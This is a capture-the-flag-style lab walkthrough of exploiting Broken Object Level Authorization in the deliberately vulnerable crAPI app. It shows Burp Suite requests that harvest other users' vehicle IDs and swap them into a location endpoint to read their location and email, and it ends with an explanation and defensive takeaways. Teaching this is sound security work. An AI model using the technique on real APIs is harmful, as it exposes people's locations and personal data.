# 📖 BOLA Exploitation Walkthrough – crAPI Labs

This note outlines the step-by-step process used in **crAPI Labs** to test for **Broken Object Level Authorization (BOLA)**. It demonstrates how unauthorized access to sensitive vehicle data can be achieved by manipulating object identifiers in API requests.

---

# 📚 Definition Bank:

### **BOLA (Broken Object Level Authorization)**

- **Definition:** BOLA occurs when an attacker can access or manipulate objects (like user data, vehicles, or documents) they are not authorized to access by **modifying identifiers** in an API request.
- **Impact:** Unauthorized data access, privacy violations, and potential data breaches.
- **Key Example:** Changing a `vehicleId` or `userId` in an API request to access someone else's data.

---

# 🎯 Steps to Identify BOLA – crAPI Labs Walkthrough:

### **Step 1: Logging in and Initial Exploration**

- Log in as **[john@test.com](mailto:john@test.com)** and access the dashboard at:
    
    ```plaintext
    http://localhost:8888/dashboard
    ```
    
- The dashboard displays the following vehicle information:
    
    ```
    VIN: 1GIGF95XMMN431588
    Company: Mercedes-Benz
    Model: GLA Class
    Fuel Type: PETROL
    Year: 2025
    ```
    
- This dashboard reveals personal vehicle details, including an image of the car.

---

### **Step 2: Navigating to the Community Forum**

- Click the **Community** tab in the navigation bar:
    
    ```plaintext
    http://localhost:8888/forum
    ```
    
- The forum displays three posts. Clicking on a post generates a URL like:
    
    ```plaintext
    http://localhost:8888/post?post_id=p9YNVj5mQG9CssvvHfQrMm
    ```
    

---

### **Step 3: Capturing Traffic with Burp Suite**

- Capture traffic using **Burp Suite** and inspect the network activity.
- Send the following request to **Repeater**:
    
    ```http
    GET /community/api/v2/community/posts/recent?limit=30&offset=0
    ```
    
- **Response:** The server responds with JSON containing multiple **vehicle IDs**, **usernames**, and **emails**:
    
    ```json
    {
       "posts":[
          {
             "id":"p9YNVj5mQG9CssvvHfQrMm",
             "title":"Title 3",
             "author":{"nickname":"Robot","email":"robot001@example.com","vehicleid":"4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5"}
          },
          {
             "id":"wYNViivCKB9BTYM3MCpPcU",
             "title":"Title 2",
             "author":{"nickname":"Pogba","email":"pogba006@example.com","vehicleid":"cd515c12-0fc1-48ae-8b61-9230b70a845b"}
          }
       ]
    }
    ```
    

---

### **Step 4: Testing for BOLA by Manipulating Vehicle IDs**

- Return to the HTTP history in Burp Suite and send the following request to **Repeater**:
    
    ```http
    GET /identity/api/v2/vehicle/80c2d9f1-159f-4f79-a77d-ccf0ec47efb7/location
    ```
    
- This request returns **John's own vehicle data**.

---

### **Step 5: Exploiting BOLA (Unauthorized Access)**

- Replace **John's vehicle ID** with another **vehicleId** captured earlier (`4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5`):
    
    ```http
    GET /identity/api/v2/vehicle/4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5/location
    ```
    
- **Response:**
    
    ```json
    {
      "carId":"4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5",
      "vehicleLocation":{"latitude":"37.746880","longitude":"-84.301460"},
      "fullName":"Robot",
      "email":"robot001@example.com"
    }
    ```
    
- ✅ **BOLA Confirmed:** John was able to access **another user's vehicle location and personal data**.

---

# ❓ Why is This a BOLA Vulnerability?

### 📌 **Key Indicators:**

- **Object Exposure:** The `vehicleId` was exposed in the `/community/api/v2/community/posts/recent` response.
- **Insufficient Authorization:** The API endpoint `/identity/api/v2/vehicle/{vehicleId}/location` failed to verify if John was authorized to access **Robot's** vehicle.
- **Direct Object Reference:** Access was determined solely by the **vehicleId** passed in the request, with **no session validation** or token check.

### 📌 **Impact:**

- **Data Exposure:** Leaked personal information including full name, email, and vehicle location.
- **Privacy Violation:** Unauthorized access to sensitive vehicle data.
- **Potential Risk:** Could be escalated to physical threats if live vehicle tracking was involved.

---

# ✅ **Key Takeaways:**

- **BOLA** occurs when **authorization checks are missing at the object level.**
- Always validate user permissions on **both client-side and server-side.**
- Use **token-based access controls** and avoid exposing **predictable identifiers**.

---